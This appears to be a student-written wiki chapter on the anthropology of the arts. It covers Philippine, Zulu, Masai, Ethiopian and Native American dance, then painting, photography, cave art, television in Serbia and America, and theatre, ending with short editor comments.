Towards the end of the 12th century, traders and settlers from Borneo and the Malay Peninsula came to the Philippine Islands and brought Islam to the Filipinos. Today, there are more than 1 million Muslim Filipinos residing in Mindanao and the Sulu Archipelago. When the Spanish came to the Philippines, the Filipino Muslims, also known as Moros, were able to resist being conquered and as a result, their Islamic lifestyle remains untouched, for the most part, even until this day, despite the completely different lifestyle of the rest of the Filipino population. There are four main Muslim ethnic groups: the Maranao, Maguindanao, Samal, and Tausug. The traditional dances in this suite make use of bright colors and rhythmic movements that represent the Middle Eastern and Indo-Malaysian influence on the culture. In this suite there is also a ribbon dance that was most likely a result of Arabian influence. Thought to be the most difficult Philippine dance is the Singkil Dance of the Maguindanao in which a woman of royal blood advertises herself to suitors by gracefully dancing with an umbrella, fan or neither while skilfully moving with bamboo poles.&lt;ref&gt;http://www.filipinasoul.com/philippine-folk-dance-singkil/&lt;/ref&gt; Another dance inspired by the war between the Muslims and the Christians is the Maglalatik which originated from the Laguna province. In this dance, the Moros wear blue pants and the Christians wear red pants. In the first half of the dance, the war over the residue of coconut milk is depicted followed by the reconciliation between the two groups.&lt;ref&gt;http://www.vtaide.com/ASEAN/Philippines/dances.html&lt;/ref&gt; This suite features specific costumes: The Malong which is a tube-like dress that is worn in a variety of ways, and the Kumbong which is a traditional headdress. The instruments played in accompaniment with the dancing are: the Agong which is a brass gong with a knob at its center, and the Kulintang which is a collection of brass gongs laid on a wooden frame.
&lt;ref&gt;http://www.camperspoint.com/article.php3?id_article=229&lt;/ref&gt;

'''Barrio Fiesta Dance'''

Great preparation is taken for Fiestas and special occasions. Food, music, dance, games, and traditional processions are all part of this traditional occurrence in Filipino villages. If the fiesta is for a wedding celebration called a Gala (Boholano), it is customary for the bride and groom to arrive with their friends and be entertained by the people who cater to them. The entertainment includes dance and musical performances as well as clashing of pots, pans, ladles, and utensils to create excitement through noise. It is then tradition for the guests to stick paper money to the bride and grooms clothing right before the final dance which involves the newlyweds participating in playful chasing. Another popular dance in this suite is called the Kalatong which is a dance from the province of Batangas and incorporates bamboo pipes used as percussion instruments. The last dance in this suite is the Tinikling; a dance that copies the movements of the long-legged Tikling bird which hops over the traps set by farmers among the rice stalks. When Philippine dancers do this dance, they hop over bamboo poles in complicated and highly coordinated leaps while the poles are being clashed together and slapped to the floor beneath them. The Tinikling is a playful courtship dance, as are most indigenous dances, that becomes more complicated as it progresses. Tinikling originated from the islands of Leyte and is the official Philippine national dance.&lt;ref&gt;http://dance.lovetoknow.com/Philippine_Ethnic_Dance&lt;/ref&gt; The costumes in this suite are the Balintawak which is a floor length dress with stiff butterfly sleeves and a vividly colored overskirt that matches the sleeves. The men wear colorful shirts called Camisa de Chinos. Props for these dances usually include an oil lamp called a Tinggoy, and wooden clogs called Bakya.&lt;ref&gt;http://www.sanjoseculture.org/artsexpress/study_kaisahan0809.pdf&lt;/ref&gt;           

'''The Maria Clara Dance'''

Maria Clara is a legendary figure in the Philippines who symbolizes the virtues and nobility of the upstanding Filipina woman. She was the main female character in a literary piece by Jose Rizal about the colonizing of the Philippines by the Spaniards. A style of dance and dress was created in honor of her and portrays its Spanish influence. The Maria Clara dress is formal attire made of an intricately designed blouse and a flowing skirt with a panuelo (square of natural fibers) worn over he shoulders. While men are in a Barong Tagalog which is a traditional Filipino shirt typically made of pineapple fibers with long sleeves and detailed embroidery. Props for this dance are bamboo castanets and the abanico (Asian fan).     This suite consists of many different dances that mean different things to the Philippine culture.

'''Igorot Dance''' 

The Igorot are a Philippine tribal people living in the central cordillera area of Northern Luzon. The six different tribes, known collectively as the Igorot, are the: Apayao, Bontoc, Ibaloy, Ifugao, Kalinga, and Kankanay. These peoples prefer to be referred to by their separate tribal names rather than simply as Igorot which was the classification word ascribed to them by the Spaniards. These tribes have religious beliefs in common that conjoin them to nature. They also honor household gods with special offerings. Dance is performed at their ceremonies as an expression of community harmony, as appeasement to their gods, in honor of their ancestors, to heal sickness, to attain the support of their gods for upcoming wars, to keep bad luck away, to seek deliverance from natural disasters, to insure a plentiful harvest, pleasant weather and to celebrate the circle of life. In these dances, women place jars and/or baskets on their heads to demonstrate the role of women in the community as food gatherers and water fetchers. For the men, there is the Manmanok dance where they use bright, woven blankets to attract the women, and the Takiling where the men dance and chant while they beat on their gangsa, brass gongs, to demonstrate their skill in weapons and hunting.

Dance in the Philippines is greatly influence by the Spanish due to the Spanish Regime. Dances and music took on the tempo and style of European dances. For example, the tempos of the Tinikling dance and the Itik-Itik acquired the tempo of the Jota and Polka. &lt;ref&gt;http://filipinokastila.tripod.com/dans.html&lt;/ref&gt;Some more examples of dances that Filipinos are known for are:

Pandango Sa Ilaw:  A Spanish dance which requires a good amount of balancing skills due to having to hold three oil lamps on the head and the back of each hand.  This dance originated from Lubang Island, Mindoro.

Cariñosa:  The name of this dance describes a women who is affectionate, friendly and loveable. This dance includes using fans and handkerchiefs while being in a flirtatious manner.

Rigodon:  This dance originated in Spain and is most commonly used at formal affairs.

Tinikling:  The national folkdance involves a pair of dancers hopping between two bamboo poles, which are held just above the ground while being struck together at in relation to the music. &lt;ref&gt;http://www.camperspoint.com/article.php3?id_article=229&lt;/ref&gt; This dance imitates the agility and grace birds used to avoid the bamboo traps in the fields set by rice farmers. The dancers symbolize the birds, therefore displaying their agility through footwork, while the bamboo poles symbolize the traps. &lt;ref&gt;http://www.giancruz.com/portfolio/imd110/city/history.html&lt;/ref&gt;

===Dance in Zulu and Masai Culture===
====Introduction====
Dance is a very important part of many African cultures. This is true for the Zulu and Masai in particular. Both of these cultures are pastoralist and have many other cultural similarities. Despite this they express their dance very differently. To explain this we will delve into various cultural aspects of Masai and Zulu society in which dance is used to find societal similarities as we as stylistic dance differences.
	To begin we must first take a look at some societal similarities between the Zulu and the Masai. This includes age sets, raiding traditions, and the importance of cattle.
	Emphasis of the Zulu society was on warfare and raiding. Age sets played a large role in this as young men were divided into these and at a certain age set were raiders and warriors. During raids Zulu warriors would pick up cattle, which were a measure of wealth in their society .  
	Shaka, the uniter of the ancient Zulu nation, gave the Zulu their pride in warfare with his dynasty. Military service was mandatory and rigorous training.  He also revolutionized the style of combat with his bullhorns method and his short stabbing spear, which was also used in warrior dances.  His constant invasion of other societies is what gave his empire so much power and it instilled a sense of nationalism in his people. 
	Warriors were chosen by what age set they were in. Age sets having been a group of people within about a ten-year age span . Many times these age sets were organized into elders, warriors, and children . In the process of initiation after puberty women had a special dance that was performed.
	In Shaka’s society cattle were a measure of wealth. If you didn’t own cattle you couldn’t get married or pay for luxuries . Cattle could be earned by raiding other societies or through outstanding military action . Sacrificing them was also a large part of their society; making sacrifices for a safe return from battle or in preparation for a successful one .	
The Masai culture, in contrast, considered themselves a purely pastoralist society and consequently placed a lot of emphasis on cattle . They were also a raiding society. Although they used hunting as a part of initiation ceremonies it was not a regular occurrence in Masai society.
Like the Zulu, the Masai used cattle as a form of wealth. They found cattle so sacred that they would not eat meat from the cow and drink milk from it in the same meal because they saw it as disrespectful to mix those things taken from the living with those taken from the dead . The Masai also believed that all cattle were rightfully theirs given by God and so were justified in taking them from other tribes .
====War Dance====
	Both the Zulu and Masai kingdoms placed an emphasis on war and raiding. It is natural then that they had a dance to accompany and portray these actions. They both had a name for these warriors. The Zulu warriors were called Indlamu and the Masai were known as the Moran. In the case of the Zulu their dance was named after their warriors.
	Many times Zulu dance was characterized by its stomping movements, which had a feeling of heaviness and connection with the earth. One example of this was the Indlamu, or warrior dance. This dance was performed at weddings along with other dances.
	Typically the Indlamu, or Zulu war dance, was performed in a large group with the dancers entering in two by two .  It was performed in unison and in some versions had three sections, the entry and preparation followed by two routines.  There was one leader who gave the cues for when to begin and when to end . This was usually characterized by a foot stomp. 
	In the version with three sections the first section of the dance was the entry where the men are crouched and moving in a circle around the dance area; the dancers then sat as their leader did a solo . When his solo was done the leader gave the signal to start the main section of the dance, which was performed in all versions. This final section was performed using a series of stomps in rhythm to the beat of sticks, or in some cases a drum . It also included a series of kicks, which varied between tribes but usually consisted of either a leg thrust straight in front of them or thrust from the front and carried around to the side . In both instances the leg stayed bent . 
	The dress for this occasion was usually traditional. Ostrich feathers were tied to the legs below the knees and on the upper arms in some cases . They also wore loincloths . As they danced they carried their shields and a spear. They also had a headdress that was similar in style to a crown. 
	The Masai also had a warrior dance called the Adumu . It was a ceremonial dance done for themselves: to form a trance-like state for the warrior. This dance, unlike its Zulu counter part was not performed for weddings but was instead used as a mental preparation. It was a test of strength and endurance. 
	The dance began with the warriors creating a circular formation. Unlike the Zulu, The Masai warriors started out standing around the outside of the circle swaying back and forth and then one or two came to the center to start the dance . They jumped up and down in a straight rod-like fashion with the goal of coming into a trance-like state . For the Masai when the person in the middle gets tired he is replaced with someone from the outside of the circle. The rhythm for this dance was found in a chant that the warriors forming the edges of the circle sang while the dancers in the middle jumped higher and higher into the air. 
	During the warrior stage of life in which this dance was performed the Masai wore their hair in long braids . Their traditional clothing was made of red cotton and very conservative in comparison to the Zulu attire of a loincloth . The cloth covered them from their chest down and was sometimes similar to a dress in its appearance.
	There is a very obvious contrast in these two styles of warrior dance. The Zulu with their creation of this connection through their body with the earth are almost polar opposite of the Masai who are reaching up into the sky with their jumping movements.  The formation of the Masai differs from that of the Zulu in that the Zulu had a very militaristic line formation to their dance while the Masai stood in a circle. There was also no specified person to begin the Masai dance while the military leader is the designated beginner in the Zulu version.
The setting in which these dances were performed is another difference. The Masai dance was performed as a mental preparation and was not intended to be a public event but the Zulu dance was performed at weddings and other occasions. The source of the beat in the Zulu dance came from sticks instead of from a chant like in the Masai dance.
The Masai and Zulu had very different costuming choices as well. The Zulu chose to wear loincloths. The Masai chose to wear long red robes, which is a stark contrast to the loincloth. 
====Wedding Dance====
	As previously stated both societies placed an emphasis on cattle. Once a young man earned enough cattle he could be married and there was a ceremony. During that ceremony there was dancing. This was true of both the Zulu and the Masai.
	The Zulu had a different dance that they perform at weddings called the Inkondlo. This dance was performed as the bride made her entrance into town.  The bride and her bridal party made up of other girls from her age set performed this as they came into the village.
	The dance began with the bride behind her bridal party. The girls are singing the inkondlo wedding song . The party started out in a bent posture and gradually became erect . In some versions dancers formed 2 files circling outward away from one another and wheeled back across center to form a line at the end of their movement . This portion of movement was quick and spirited with movements back and forward.
The bridal party started the next section of the dance with the bride and her bridesmaids coming out from behind the party . When in front the bride does a solo to complete the first section . The movements in this section were very proper and pleasant. 
	The Inkondlo itself was a rhyming poem. They used this as the basis for the dance. It was performed as part of the dance.
The Masai wedding dance was called a Kayamba; named after the rib like instrument used in the accompanying music.  The young girls of the tribe were the performers in the case of the Masai.
	The music used a repetitive melody doubled by a chorus.  It was accompanied by a high-pitched bungo horn. Rattles and whistles were minor accompaniments. The Kayamba is one of these rattles; made of wood and reeds with little pebbles on the inside . This music was very dynamic with its many parts.
As the young girls danced they added to the music with bells tied to their ankles . This made the dance very rhythmic. The Masai wedding dance would have been more for entertainment of the wedding party than it’s Zulu counter part.
The wedding dances of the Masai and Zulu contrast nicely. The Masai dance was very rooted in its music and performed as entertainment for the wedding party. The Zulu dance was a celebratory way of bringing the bride into town that used a simple poem chant.  It is interesting to note that these dances were both named after the music used in them; the Zulu after the Inkondlo poem and the Masai after the Kayamba instrument. The Kayamba music was very dynamic and had many parts to it. The Zulu music was very simplistic with its one part chant. 
Performers of the wedding dances were very different as well. The young girls of the kingdom performed the Masai dance.  In contrast the bridal party performed the Zulu dance.

====Coming of Age Dance====
Both men and women in Masai and Zulu culture had age sets. To become part of the next age set there were rituals and ceremonies to take part in. Many times those ceremonies included dancing. In Zulu society women had a very special ceremony, as they became women. The ritual that is most intriguing about Masai initiation comes after the killing of a lion.
The Zulu women had a very interesting dance ritual as part of their initiation into womanhood. Part of their initiation was to stay isolated in their hut for a week with only their mother and one friend . After this period they came out and danced.
In preparation for the their dance they made grass costumes. They weaved together grass to make their outfits that would later be burned after the ceremony .   The friends and sisters of the woman being initiated would also participate in the grass, costumed dance .
The final ceremony was full of singing and dancing. The woman was officially initiated with her friends and sisters. The final act of the ceremony was the burning of the grass clothing that signaled the step into womanhood .
As a part of their initiation into manhood the Masai were required to go on a lion hunt . When they were successful there was a ceremony that involved the Engilkainoto dance . This dance was performed for the tribe as a celebration of the feat.
The lion conquerors picked a female partner to dance with and danced in the middle of a crowd gathered to watch them celebrate . Each couple proceeded through the crowd to the center to dance together. 
The warriors wore ostrich feathers on their head . They also carried a spear with the paws or tail of the lion attached . Their female partners wore beaded dresses.  
	Besides the fact that these initiation ceremonies were for different sexes there were some other contrasts in the dances performed during them. For one thing the Zulu dance was done as a group of women as a sort of core instead of being a partner dance like the Masai.
	Their costumes differed in that the Masai wore their warrior uniforms and decorated their spears with the paws and tail of the lion. The girls in the Zulu dance wore grass outfits that were burned at the end of the ceremony. The girls in the Masai dance wore beaded clothing which was much more permanent.

====Ethiopian Dance====
      
	Ethiopia has a lot of different dances depending on the region. the main dance is called Escista. it is mainly preformed using the shoulder and chest to make rapid movements. another famous dance is Gurage. this dance is different because leg movements are very essential. Gurage uses kick moves that go with the beat that is being played. another big dance is Tigrenga, this dance requires the participation of a group. the group would make a circle and move in the circle according to the beat. some people may choose to go in the middle of the circle to preform their own moves. these dances are mostly preformed at weeding and holiday gatherings.

'''Conclusion'''

	The Zulu and Masai use different movements to characterize similar cultural events. Zulu dancers have a very heavy, grounded feeling to their dance while Masai dancers have a very taught and jumpy feel. By using dances about similar aspects of life it is made easier to compare their styles. Although their expressions of life aspects may be different, the things they dance about give us a sense of what is important to them.

=== Native American Dance ===

Native American dance has profound and deep spiritual meaning within their culture. A prime example of this would be the mask rituals of the Kwakiutl, a Native American tribe local to Washington state. These rituals bring together song, dance, and storytelling in a fantastic and mystical way. The story's range from story's about the origin of the Kwakiutl, to silly stories meant to scare children into being good. All of these dances are accompanied by chanting and drums, which are made primarily out of cedar and animal skins.

&lt;ref&gt;http://www.lelooska.org/&lt;/ref&gt;
The Ghost Dance was created and performed by paiute in in the 1890's as a result of the harsh conditions surrounding Native Americans after half a century of dominance by another culture. One direct causes of this was the complete slaughter of buffalo herds throughout the last half of the 19th century. A depletion of their food sources meant that many Native Americans were forced to instead live and work on reservations carved out of the land by the U.S. government.

===Dance, Art or Sport?===

In American society, it is sometimes stereotyped as simple, or un-athletic to be a ballerina. Dance is &quot;not a sport&quot; but rather &lt;i&gt;just&lt;/i&gt; a form of art. However in many places across the 
nation, football players are being sent to ballet class to be taught the art of balance, walking/ running through their toes and quick action pivots. Retired Steelers players Lynn Swann and 
Herschel Walker, along with ex-competitive bodybuilder Governor Arnold Schwarzenegger had at one point incorporated ballet classes into their regular work outs. Dance of all kinds, whether it be modern, jazz, ballet, kick &lt;ref&gt;Pacheaco, Carly. Western Washington University&lt;/ref&gt;, tap, hip-hop, break dancing, krumping, salsa, waltz, foxtrot
and even pole dancing all takes an extreme amount of control and strength and athletes have begun to recognize the benefits. Walker even took it a step further and performed in a show with the 
Fort Worth Ballet. &quot;Despite having gone through 2-a-day training camps and getting hit repeatedly by massive linebackers, Walker called the ballet performance, 'The hardest thing I've 
ever done.'” Likewise dancers are training equally hard and as long as many professional athletes. The Southwest Washington Dance Ensembles company dancers rehearse up to 8 hours 
on Saturdays for shows starting up to 4 months before the opening, along with taking anywhere between 3 to 6 classes a week. While I was performing with the group I remember the 
very long and hard hours that I spent in the studio and then followed by a long shift working as a waitress. I suppose the biggest differences between dance and athletics is that 
stadiums do not get sold out for a single performance( the venues are incredibly smaller) and the amount of money dancers receive for their performance is much less. While football players and other 
professional athletes are getting paid millions of dollars a year, many professional dancers do not receive even close to that amount of money. The field is also much more competitive, 
as only prima ballerinas get to the lead roles. However, in other cultures such as Russia where the Moscow ballet is a much bigger deal, audiences would much rather pay high prices for 
a viewing of the FireBird. The lack of interest and in general recognition of the hard work that dancers put into their &quot;sport&quot; is a reflection of the priorities of entertainment 
of America. When it comes to other cultures, such as Bahia, Brazil, countries do treat dance as a form of art AND a sport. In &quot;Dance Lest We All Fall Down,&quot; the story of anthropologist Margaret Wilson's experiences living for a time in Bahia, she discusses and participates in capoeira. Capoeira was first created in Brazil by the slaves brought from Africa. It is said to be a combination of African martial arts and Brazilian dance moves. It is also said that this form of &quot;fighting&quot; was a self-defense mechanism designed by the slaves to look like dance so they wouldn't get in trouble with those in control. Capoeira is similar to what we know as martial arts only it involves a small group of people who surround the dancers in the middle as they &quot;fight&quot; (without ever making physical contact) to the beats of multiple instruments. These capoeira groups travel around &quot;playing&quot; with different capoeira groups, or in other words competing, and the more modern version has become the National Brazilian Sport, even though it began as a mysterious and ancient form of art. Many could describe capoeira as a form of dance as well which shows that dance can be interpreted as a sport or an art depending on the cultural constructs of each country. It just so happens that here in America, dance is widely known as an art rather than a sport. Yet this does not mean dancers are not athletes.

==Media==
By definition, media is the means of communication, as radios, televisions, newspapers and magazines, that reach or influence people widely. This meaning of media has been around since the printing press made it easier to produce large masses of papers to spread news to the public. Today, mass media can be seen as a form of art because there are so many aspects and rules to creating an appropriate message that also must be effective to the public. Media can also be seen as a form of art because it is a form of expression that reaches out to a large sum of people. Media is a less obvious form of art such as paintings, drawings, and sculptures, but certain aspects of the media have just as much creativity and effort put into them that make the media a form of art that can be seen in everyday life.

===Sculpture===
Sculpture is three-dimensional artwork created by shaping or combining hard and/or plastic material, sound, and/or text and or light, commonly stone (either rock or marble), metal, glass, or wood. Some sculptures are created directly by finding or carving; others are assembled, built together and fired, welded, moulded, or cast. Sculptures are often painted. A person who creates sculptures is called a sculptor.
Because sculpture involves the use of materials that can be moulded or modulated, it is considered one of the plastic arts. The majority of public art is sculpture. Many sculptures together in a garden setting may be referred to as a sculpture garden. &lt;ref&gt;http://en.wikipedia.org/wiki/Sculpture&lt;/ref&gt;

Over the ages there have been many great sculptors who have effectively personified the spirit of their time. A few of these are Michelangelo &lt;ref&gt;http://en.wikipedia.org/wiki/Michaelangelo&lt;/ref&gt;, Auguste Rodin &lt;ref&gt; http://en.wikipedia.org/wiki/Auguste_Rodin&lt;/ref&gt;, and Gian Lorenzo Bernini &lt;ref&gt;http://en.wikipedia.org/wiki/Bernini&lt;/ref&gt;

===Painting===
[[File:REKrewDF17.JPG|300px|right|thumb|Graffiti by RE Krew of Chalco Baner, Arian, Greko, Higer and Septimo. Mexico City
16 September 2009]]
Throughout time, painting, much like most other art forms, has been used to express emotion, invention, and the change in times. The first known painting was found to be in caves in France around 32,000 years ago.&lt;ref&gt;A Treatise on Painting by Leonardo Da Vinci (Kessinger Publishing)&lt;/ref&gt; More familiar art work dates ancient Greek, Rome and Renaissance time period.&lt;ref&gt; Richard Tansev Gardner's Art Throughout the Ages&lt;/ref&gt; During this time, religion was the main theme of artwork and later began to depict political characters in complex and intricate portraits. The far eastern styles such as Chinese and Japanese were also concerned with depicting religion but with different media. While they preferred ink and silk, Western culture began adopting the lightness of watercolors and oils. African art differs greatly from Western art as they had an abundance of functional art. Masks and jewelry were important accessories that were used in ritual ceremonies symbolizing spirits and ancestors. Although murals can be dated as far back to the beginning of artwork, Muralism, or “Muarlismo”, was a movement that brought much attention to Mexican artwork in the 1900’s. The Mexican mural movement was born in the 1920s following the Revolution (1910-1917) and was part of the government's effort to promote its ideology and vision of history. The murals were done in a way to strengthen Mexican identity and artists were commissioned to create images of the cultural history of Mexico and its people. Perhaps inspired by the murals of the 20th century, the urban Graffiti on construction panels on side of the Palacio de Bellas Artes continue to decorate Mexico City.

===Photography===
The word photography derives from two ancient Greek words: photo, meaning &quot;light,&quot; and graph, meaning &quot;drawing.&quot; &quot;Drawing with light&quot; is a way of looking at the term photography. &lt;ref&gt; http://scphoto.com/html/history.html &lt;/ref&gt; Arguably invented in the 5th century B.C. by Mo Ti, a Chinese philosopher, photography has been a means of creating still images. Mo Ti was able to describe the pinhole camera which is the simplest type. This can be made from black paint, a blank photo, and cardboard. The idea is that with one small pinhole, light can emit to the back of the box to the photo in such a way that reflects the projected scene. Photography has advanced considerably since then starting in the early 1900's with the discovery of chemical compound that permanently hold the image. &lt;ref&gt; Shaynne Costello, Graphic Design major and Art History Minor at WWU. &lt;/ref&gt; This new technology brought with it a new ways of recording historical documents. One of the first examples of this is the photographs of President Abraham Lincoln. Lincoln understood the importance of photography and in 1860 he had his portrait taken by Mathew B. Brady, the most famous professional photographer in the history of American photography. Native Americans in the past have refused to have their photograph taken for fear of losing their soul. In San Juan Chamula, Mexico it is illegal to take photographs in church.

==== Cave Paintings ====
The cultural practice of painting is an art whose origins date back tens of thousands of years in the form of cave paintings. While cave paintings have been discovered all over the world, some of the earliest examples of this art occur in Africa in the region of Namibia. These paintings, which depict animals painted on stone slabs, have been dated to be nearly 30,000 years old and were speculated to have been done by the San people. Since their discovery in 1969, these paintings were thought to be the earliest known examples of cave art. However, that distinction was lost with the discovery of the Cauvet cave in 1994. The cave, which was happened upon accidentally by potholers in Southern France, contains wall paintings depicting animals from bison, horses, and deer to lions, rhinoceroses, and mammoths. Radiometric dating placed the ages of the earliest of these paintings at approximately 31,000 years old, which clearly places them as the earliest forms of cave art to be discovered so far. &lt;ref&gt;http://www.historyworld.net/wrldhis/PlainTextHistories.asp?groupid=1345&amp;HistoryID=ab20&lt;/ref&gt;
	The actual purposes of cave art have been the source of much speculation. In studying the practices of modern tribal societies, some modern scholars have theorized that cave paintings were probably tied into the concepts of religion and magic that were held by the societies of those early painters. However, the precise reason as to why the paintings were created in the first place is still a topic of debate. Whether the paintings were made to bless the efforts of early hunters or were meant to act as a shamanic aid for tapping into the spiritual world, or were created for a wholly different reason is a question that may never be answered. However, the existence of cave paintings themselves reveals that even from earliest times, humans have been interested in being able to depict the objects and environments of the world around them. It is an interest that has continued to be prevalent within human culture across time and space and is a fascination that will most likely last well into the future.

There were a few basic methods that prehistoric people probably used to paint these cave walls. It is theorized that they used sharp tools or spears to etch figures, mostly animals, into the rock. The paint or color that they used to decorate the cave art was most likely used from charcoal, soot, clay, or various types of berries. Basic tools to apply color could have been constructed out of straw, leaves, or hair attached to sticks or reeds. They also might have sprayed on color through hollow reeds or bones in an airbrush type fashion. &lt;ref&gt; Peter J. Ucko and Andree Rosenfeld, Science Magazine. http://www.sciencemag.org/cgi/reprint/161/3837/150-a &lt;/ref&gt;

===Television and Film===
It is no doubt that the roles of television and film have become more prominent in everyday life as decades have passed and improvements have been made in technology. People tend to watch television and films for entertainment or news purposes, especially since they have become more available and accessible to watch to people around the world. However, they are treated differently in different countries, from a portion of Serbia only being able to watch a certain channel to having 500 channels on every television in almost every home in America. Although television and film have become more common as years have passed, most people do not realize the work and corruption that exists through the media and is being placed in the homes of millions.

====The Role of Television in Everyday Life of the Family in Serbia====
The first channel of National television (RTS) is the only one which is possible to watch everywhere in Serbia. It is estimated that aproximately one third of population in Serbia can watch only this channel.&lt;ref&gt; Maša Vukanovich http://www.anthrobase.com/Txt/V/Vukanovich_M_01.htm &lt;/ref&gt; Other relevant channels, apart from strictly local ones, are: Studio B which covers Belgrade and area of 100 km around Belgrade, including Kragujevac, which is 3.5 millions of viewers; BK television station watch 25% of population, which means Belgrade and surrounding area. Until NATO aggression it was possible to see it in Leskovac as well. Television station &quot;Pink&quot; covers Belgrade and surrounding area, but they use cable links of National television which provides them larger territory. These are the &quot;biggest&quot; TV stations in Serbia by the number of viewers and area which they cover. TV &quot;Pink&quot; is the only commercial station in stricto senso: they play movies, soap operas, music and sport shows.

Variety of shows on both TV and radio caused a variety of preferences. One of the most common indicators of popularity of shows are charts published in specialized TV and radio magazines. According to the research performed in 1986/87 by Milena Dragievi - Šeši and group of students of Belgrade's Faculty for Drama Arts, at the time favorite shows in Serbia were sports, local Belgrade programs, movies and soaps, folk music and other entertainment shows, whereas favorite radio stations were Studio B and Belgrade 202. On the chart published in a specialized TV magazine &quot;TV Novosti&quot; on the 3rd of April 1996 the first place was held by domestic soap opera &quot;Sreni ljudi&quot; (&quot;Happy people&quot;), followed by sports (football, volleyball, handball) and movies. In January 200 the most popular show in Belgrade was &quot;7 o' clock news&quot; on Studio B television whereas in Serbia on the first place was hispanoamerican soap &quot;Pravo na ljubav&quot; (&quot;The right to love&quot;) played on TV Pink. Preferences follow the line: movies, soaps, sports, news, and educational shows. This line is a consequence of essential functions of television: informational, educational and entertaining.

The majority of my informants named entertainment as a main reason why they watch television. When you don't have anything better to do, you just turn on your TV set and sail away where everything is different. You can rest from everything and everyone. The best sail away possibilities are offered in the soaps and movies. Switching to another reality provides rest from everyday life problems. These shows often appeal to women, while men find their escape in sports, especially football.

====Television in America====
The average American household has the TV on for an average of 7 hours, 12 minutes per day. &lt;ref&gt; TV-Free America http://members.iquest.net/~macihms/HomeEd/tvfacts.html &lt;/ref&gt; This is most likely because 98% of homes in the United States have at least one television set, while the average home has between 2 and 3 televisions. As a nation, we watch 250 billion hours of television annually and almost 50% of Americans admit that they watch TV too often. TV is one of the top advertising agents because it is so common; 30% of TV broadcast time is devoted to advertisement and in a year most children will see 20,000 30 second commercials. &lt;ref&gt;The Sourcebook for Teaching Science. http://www.csun.edu/science/health/docs/tv&amp;health.html)&lt;/ref&gt; 82% of Americans believe that &quot;most of us buy and consume far more than we need.&quot; &lt;ref&gt; TV-Free America http://members.iquest.net/~macihms/HomeEd/tvfacts.html &lt;/ref&gt;

Children start watching TV at a very young age which is not beneficial to their health.  It takes away from them going outside and interacting with other kids.  This can also result in weight gain because instead of being active they sit and munch while watching TV.&lt;ref&gt;http://kidshealth.org/parent/positive/family/tv_affects_child.html&lt;/ref&gt; In the span of 30 years (from 1963 to 1993), the percentage of American children ages 6 to 11 who were seriously overweight went from 4.5 to 14. &lt;ref&gt; TV-Free America http://members.iquest.net/~macihms/HomeEd/tvfacts.html &lt;/ref&gt;

However, television isn't necessarily all bad. Many viewers, myself included, regard TV as a much-appreciated source of relaxation and tune in to their favorite shows as a means of resting their bodies and recharging their minds after a long day at work or school. TV can also help to meet emotional needs, albeit on a somewhat superficial level, as it often functions as a source of escapism and even catharsis. In short, while I agree that watching too much television can have negative side-effects such as increasing rates of consumption and contributing to childhood obesity, I also believe that, in moderation, it is a perfectly healthy practice that can serve valuable functions in the lives of viewers.

Studies from the University at Buffalo and Miami University of Ohio have shown that television can also help stave off loneliness and rejection.  It follows the 'social surrogacy hypothesis', which states that humans can use technologies to provide themselves a false sense of social belonging when there has in fact been no actual social interaction.  Connecting with characters can help ease a viewer's need to connect with others, allowing a person to feel as though his/her social needs are being met.  The first study found that subjects were less lonely while watching their favorite programs.  The second study found that those who connected with the programs on a deeply social level described the programs at further length.  The third study found that subjects just thinking about their favorite programs were buffered against drops in self-esteem and increases in negative moods and feelings of rejection.  The fourth study found that those who had written about their favorite program (as referenced in the second study) felt fewer feelings of loneliness.  The question remains, however, if this 'social surrogacy' actually fulfills social needs or simply suppresses them.  &lt;ref&gt; For some, TV cures loneliness http://web.archive.org/web/20090501191755/news.yahoo.com/s/nm/20090428/tv_nm/us_loneliness &lt;/ref&gt;


====Media and Television====

The function of the media is to help define what “legitimate” behavior is. From sitcoms that overtime cover a wider range of materials (such as divorce, mixed race relations, single parents etc.) , to questioning the acts of politicians and government acts. In 1970 25% of Americans reported getting their political information from the television, by 2005 that number has more than doubled to 70% getting the majority of their information from the television. Today between 6-8 firms control over 50% of all media coverage. These firms include: Time Warner/AOL, Disney, Bertelsmann, Viacom, News Corp, and Vivendi. This number has changed drastically over the past several decades, in 1981 there were 46 major firms, in 1986 there were 24, in 1990 there were 17, and in 1996 there were 11. &lt;ref&gt; Todd Donovan, Western Washington University Political Science Professor &lt;/ref&gt;

====Video and attendance of transnational fiestas====
Among the transnational Mixtec community spanning the United States and Mexico video has become an important form of communication across the international boundary of the border. Attendance of community fiestas associated with patron saints days, Quinceañeras and weddings is required by close kin especially god parents. However, for many families crossing the border and traveling many miles is prohibitive to attending these fiestas. Since the late 1980s video has been increasingly used to allow distant family members to 'participate' in the fiestas from the comfort of their living rooms. In parts of California it is common to see Tias (aunts) and comadres (friends) replaying the videotaped fiestas for years after the event occurred. &lt;ref&gt; Paul James personal communication. April 2009. &lt;/ref&gt;

==Theatre==
Different forms of theatre are an important art form across nearly all cultures. Theatre most likely got started in the form of various dramas that were part of religious rituals and ceremonies. Ancient Greek civilization formalized this idea into a form of entertainment and expression. Greeks also divided theatre into two district forms: comedy and tragedy.  In most aspects all modern theatre still falls into one of these categories. It is also common for theatre to contain aspects of other art forms such as dance, music, visual art in the form of backdrops and costumes, as well as written within scripts. Theatre has been localized very well in the U.S. with most towns having their own theatres, both professional and volunteer based. National Broadway tours make it to most major cities and most, if not all, high schools and colleges in the nation offer some form of theatre for students. &lt;ref&gt; http://www.cwu.edu/~robinsos/ppages/resources/Theatre_History/Theahis_1.html &lt;/ref&gt;

===Improvisational Theater===
Improvisational Theater, also known as “Improv,” usually consists of a group or band of “players” who join in improvised exercises or games that involve playing a part of a scene. The nature of Improv is to be spontaneous and in the moment. It is synonymous with organized flexibility. Much like regular theaters, Improvisational Theaters will perform regular shows and performances; highlighting the principle players. However, Improv Theater is unique due to the fact that there is no set script to be rehearsed and memorized. There may be an outline of where the director wants the show to go, but usually not. Occasionally, music and/or other mixed visuals are added to the exercises. Often, there is a set theme involved for the exercises and/or performances: such as a musical. If a director is necessary for the Improv performance to function, an artistic director will be utilized. Often, that director is a former player or is currently involved in the exercises. The “directors or managers,” tend to work together in collaboration regarding their individual responsibilities for the group. These types of organizations differ from competition-based organizations because the competition-based organizations have a structure and organization goal preset for them. This flexible structure is intriguing to Improv Theater groups because the members can come and go to rehearsals as they please. Rehearsals for Improv groups concentrate more on honing their skills as Improv actors, compared to conventional play rehearsals.

I added an introduction to the general &quot;play&quot; section because I felt that it needed a broader introduction then starting off with a definition. 

==1 Play==
1.1 Child Play in the United States

I added more to the sentence because I felt that there was more that needed to be said. 
